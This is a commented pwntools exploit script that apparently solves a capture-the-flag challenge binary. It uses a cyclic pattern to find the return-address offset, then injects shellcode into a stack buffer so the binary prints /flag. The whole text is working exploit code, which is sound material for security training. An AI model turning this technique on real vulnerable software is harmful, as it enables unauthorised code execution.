#!/usr/bin/python3
from pwn import *

# Set the machine architecture
context.arch = "amd64"

# Retrieve the ELF information from the binary and run it
elf = ELF("/challenge/toddlerone_level2.0")
io = elf.process(setuid=False)

# Send the payload size to the program in order 
# to compute the buffer size
io.recvuntil(b'Payload size: ')
io.sendline("512")

# Build and send the payload to the program
# NOTE: cyclic function setup a pattern payload that with
#       cyclic_find can be used to retrieve the distance
#       between buffer and return address
io.sendline(cyclic(512, n=8))
io.wait()
buff_len = cyclic_find(io.corefile.fault_addr, n=8)

# Run the program again
io = elf.process()

# Retrieve the address of the buffer location where we will load the shellcode
io.recvuntil(b'The input buffer begins at 0x')
shellcode_addr = int(io.recvuntil(b',').decode()[:-1], 16)

# Build the shellcode to open the "/flag" file
shellcode = asm(shellcraft.cat('/flag'))

# Send the payload size to the program
# NOTE: the size of the payload is computed as: 
#       distance_from_return_address + return_address_length
io.recvuntil(b'Payload size: ')
io.sendline(f'{buff_len + 8}'.encode())

# Build and send the payload to the program
# NOTE: as return address we set the buffer address and we load less padding
#       in order to fit the shellcode inside the buffer
PAYLOAD = shellcode + b'A'*(buff_len - len(shellcode)) + p64(shellcode_addr)
io.recvuntil(b'Send your payload')
io.sendline(PAYLOAD)

# Print the output of the program
print(io.recvall().decode())